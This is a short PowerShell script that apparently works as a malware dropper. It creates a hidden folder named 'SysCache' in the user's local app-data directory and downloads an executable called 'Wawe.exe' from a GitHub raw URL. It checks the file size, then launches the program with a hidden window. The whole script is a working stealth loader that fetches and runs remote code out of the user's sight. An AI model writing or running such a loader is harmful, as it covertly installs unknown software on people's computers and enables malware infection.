$hiddenDir = Join-Path $env:LOCALAPPDATA 'SysCache'
if (-not (Test-Path $hiddenDir)) { New-Item -ItemType Directory -Path $hiddenDir -Force | Out-Null }
$f = Get-Item $hiddenDir -Force
$f.Attributes = $f.Attributes -bor [System.IO.FileAttributes]::Hidden

$exe = Join-Path $hiddenDir 'Wawe.exe'
$url = 'https://github.com/jesuss13377-source/wa/raw/refs/heads/main/Wawe.exe'

Invoke-WebRequest -Uri $url -OutFile $exe -UseBasicParsing

$info = Get-Item $exe
Write-Host "Downloaded size: $($info.Length) bytes"

if ($info.Length -lt 102400) {
    Write-Host "ERROR: file too small, probably HTML page, not exe."
    return
}

Start-Process -FilePath $exe -WindowStyle Hidden
